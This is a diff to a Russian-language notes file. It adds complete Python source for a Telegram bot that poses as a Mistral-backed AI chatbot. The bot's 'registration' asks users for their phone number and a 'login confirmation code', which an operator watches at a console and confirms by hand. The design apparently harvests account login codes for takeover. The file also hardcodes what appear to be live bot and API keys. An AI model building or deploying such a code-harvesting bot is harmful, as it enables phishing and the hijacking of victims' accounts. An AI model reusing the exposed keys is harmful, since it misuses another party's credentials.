@@ -3,3 +3,233 @@ https://github.com/s0md3v/be-a-hacker
 https://saymineapp.com/login - удалить информацию о себе с сайтов
 
 https://www.scam-detector.com/validator/pitergsm-ru-review/ - проверка скам сайтов
+
+
+
+
+
+
+
+-------------- БОТ --------------
+
+import logging
+from telegram import Update, Bot
+from telegram.ext import Application, MessageHandler, filters, ContextTypes, CommandHandler
+import threading
+import asyncio
+import time
+import httpx
+import json
+
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
+)
+logging.getLogger("httpx").setLevel(logging.WARNING)
+
+logger = logging.getLogger(__name__)
+
+TELEGRAM_BOT_TOKEN = "7981422770:AAFZl2CwlJ1PMHDiMmE1uRgLppXeLElgbIY"
+MISTRAL_API_KEY = "vEukHIlqO6YhxQq2UmIhcLPDu3RJalPN"
+MISTRAL_API_URL = "https://api.mistral.ai/v1/chat/completions"
+MISTRAL_MODEL = "mistral-large-latest"
+
+user_states = {}
+user_data = {}
+message_to_delete = {}
+
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user = update.effective_user
+    chat_id = update.effective_chat.id
+    user_data[chat_id] = {"username": user.full_name}
+
+    welcome_message = (
+        f"Приветствую! {user.full_name}. Для начала пройди регистрацию. "
+        "Введи свой номер телефона в формате +7**********: "
+    )
+    await update.message.reply_text(welcome_message)
+    logger.info(f"Пользователь {user.full_name} ({chat_id}) начал бота и получил приветствие.")
+    user_states[chat_id] = "awaiting_phone"
+
+
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    chat_id = update.effective_chat.id
+    message_text = update.message.text
+    username = user_data.get(chat_id, {}).get("username", "Неизвестный пользователь")
+
+    logger.info(f"Сообщение от {username} (ID: {chat_id}): {message_text}")
+    print(f"\n--- НОВОЕ СООБЩЕНИЕ от {username} (ID: {chat_id}) ---")
+    print(f"Пользователь: {message_text}")
+    print("-------------------------------------------------")
+
+    current_state = user_states.get(chat_id)
+
+    if current_state == "awaiting_phone":
+        if message_text.startswith("+7") and len(message_text) == 12 and message_text[1:].isdigit():
+            user_data[chat_id]["phone_number"] = message_text
+            print(f"Админ: Получен номер телефона от {username} (ID: {chat_id}): {message_text}")
+            await update.message.reply_text("Подтвердите ваш номер телефона. Введите код подтверждения входа: ")
+            user_states[chat_id] = "awaiting_code"
+            print("Админ: Пользователю предложено ввести код подтверждения. Ожидаем ввод.")
+        else:
+            await update.message.reply_text("Пожалуйста, введите номер телефона в формате +7**********: ")
+
+    elif current_state == "awaiting_code":
+        user_data[chat_id]["entered_code"] = message_text
+        print(
+            f"Админ: Пользователь {username} (ID: {chat_id}) ввел код подтверждения: {message_text}. Пожалуйста, подтвердите вручную. (Введите 'Y' для подтверждения, 'N' для отклонения)")
+        await update.message.reply_text("Ваш код проверяется. Ожидайте подтверждения от администрации.")
+
+    elif current_state == "registered":
+        thinking_message = await update.message.reply_text("Думаю...")
+        message_to_delete[chat_id] = thinking_message.message_id
+        await send_to_mistral(chat_id, message_text, context.bot)
+
+    else:
+        await update.message.reply_text(
+            "Пожалуйста, следуйте инструкциям. Если вы хотите начать заново, отправьте команду /start."
+        )
+        print(f"Админ: Неожиданное сообщение от {username} в неопределенном состоянии.")
+
+
+async def send_to_mistral(chat_id: int, user_query: str, bot: Bot) -> None:
+    headers = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Authorization": f"Bearer {MISTRAL_API_KEY}"
+    }
+    payload = {
+        "model": MISTRAL_MODEL,
+        "messages": [
+            {"role": "user", "content": user_query}
+        ]
+    }
+
+    try:
+        async with httpx.AsyncClient() as client:
+            response = await client.post(MISTRAL_API_URL, headers=headers, json=payload, timeout=60.0)
+            response.raise_for_status()
+            mistral_response = response.json()
+            llm_response_content = mistral_response["choices"][0]["message"]["content"]
+
+        if chat_id in message_to_delete:
+            await bot.delete_message(chat_id=chat_id, message_id=message_to_delete[chat_id])
+            del message_to_delete[chat_id]
+
+        await bot.send_message(chat_id=chat_id, text=llm_response_content)
+        logger.info(f"Ответ Mistral отправлен пользователю {chat_id}: {llm_response_content[:50]}...")
+
+    except httpx.HTTPStatusError as e:
+        logger.error(f"HTTP ошибка с Mistral API для chat_id {chat_id}: {e.response.status_code} - {e.response.text}")
+        if chat_id in message_to_delete:
+            await bot.delete_message(chat_id=chat_id, message_id=message_to_delete[chat_id])
+            del message_to_delete[chat_id]
+        await bot.send_message(chat_id=chat_id,
+                               text="Произошла ошибка при получении ответа от нейронной сети. Попробуйте еще раз.")
+    except httpx.RequestError as e:
+        logger.error(f"Сетевая ошибка с Mistral API для chat_id {chat_id}: {e}")
+        if chat_id in message_to_delete:
+            await bot.delete_message(chat_id=chat_id, message_id=message_to_delete[chat_id])
+            del message_to_delete[chat_id]
+        await bot.send_message(chat_id=chat_id,
+                               text="Проблемы с соединением. Пожалуйста, проверьте ваше интернет-соединение и попробуйте позже.")
+    except Exception as e:
+        logger.error(f"Произошла непредвиденная ошибка с Mistral API для chat_id {chat_id}: {e}")
+        if chat_id in message_to_delete:
+            await bot.delete_message(chat_id=chat_id, message_id=message_to_delete[chat_id])
+            del message_to_delete[chat_id]
+        await bot.send_message(chat_id=chat_id, text="Произошла непредвиденная ошибка. Попробуйте еще раз.")
+
+
+async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
+    logger.warning(f"Ошибка {update} вызвала ошибку {context.error}")
+
+
+def run_admin_loop(application: Application):
+
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+
+    loop.run_until_complete(admin_console_loop(application))
+
+
+async def admin_console_loop(application: Application):
+    while True:
+        try:
+            active_chat_ids = [cid for cid, state in user_states.items() if state == "awaiting_code"]
+
+            if active_chat_ids:
+                print("\n--- Ожидание решения администратора ---")
+                for chat_id in active_chat_ids:
+                    username = user_data.get(chat_id, {}).get("username", "Неизвестный пользователь")
+                    phone = user_data.get(chat_id, {}).get("phone_number", "Н/Д")
+                    code = user_data.get(chat_id, {}).get("entered_code", "Н/Д")
+                    print(f"Пользователь: {username} (ID: {chat_id}), Телефон: {phone}, Введенный код: {code}")
+                    print(f"Подтвердите код для {username} (ID: {chat_id}). Введите 'Y' (верно) или 'N' (неверно):")
+
+                admin_decision = await asyncio.to_thread(input,
+                                                         "Админ: ")
+
+                if admin_decision.lower() == 'exit':
+                    break
+
+                for chat_id in list(active_chat_ids):
+                    if admin_decision.lower() == 'y':
+                        await application.bot.send_message(chat_id=chat_id,
+                                                           text="Спасибо за регистрацию! Введите ваш первый запрос: ")
+                        user_states[chat_id] = "registered"
+                        print(
+                            f"Админ: Пользователь {user_data.get(chat_id, {}).get('username', 'Неизвестный пользователь')} (ID: {chat_id}) успешно зарегистрирован.")
+                    elif admin_decision.lower() == 'n':
+                        await application.bot.send_message(chat_id=chat_id, text="Неверный код подтверждения.")
+                        user_states.pop(chat_id, None)
+                        user_data.pop(chat_id, None)
+                        print(
+                            f"Админ: Пользователь {user_data.get(chat_id, {}).get('username', 'Неизвестный пользователь')} (ID: {chat_id}) отклонен из-за неверного кода.")
+                    else:
+                        print("Админ: Некорректный ввод. Пожалуйста, введите 'Y' или 'N'.")
+            else:
+                print("Админ: Нет ожидающих запросов на верификацию. Ожидание новых кодов от пользователей...")
+                await asyncio.sleep(2)
+
+        except Exception as e:
+            logger.error(f"Ошибка в потоке консоли администратора: {e}")
+            print("Произошла ошибка в консоли администратора. Пожалуйста, проверьте логи.")
+            await asyncio.sleep(2)
+
+
+def main() -> None:
+    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+
+    application.add_error_handler(error_handler)
+
+    # Запускаем поток для обработки ввода админа из консоли
+    # Вместо прямого вызова функции, запускаем в ней цикл событий
+    console_thread = threading.Thread(target=run_admin_loop, args=(application,), daemon=True)
+    console_thread.start()
+
+    application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
+
+
+if __name__ == "__main__":
+    if TELEGRAM_BOT_TOKEN == "7981422770:AAFZl2CwlJ1PMHDiMmE1uRgLppXeLElgbIY":
+        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
+        print(
+            "!!!!!")
+        print("!!!!!!")
+        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
+    if MISTRAL_API_KEY == "vEukHIlqO6YhxQq2UmIhcLPDu3RJalPN":
+        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
+        print("!!!!!!")
+        print("!!!!!!")
+        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
+
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\nБот остановлен пользователем. До свидания!")
+
+-----------------------------------------------------------------------------------------------------
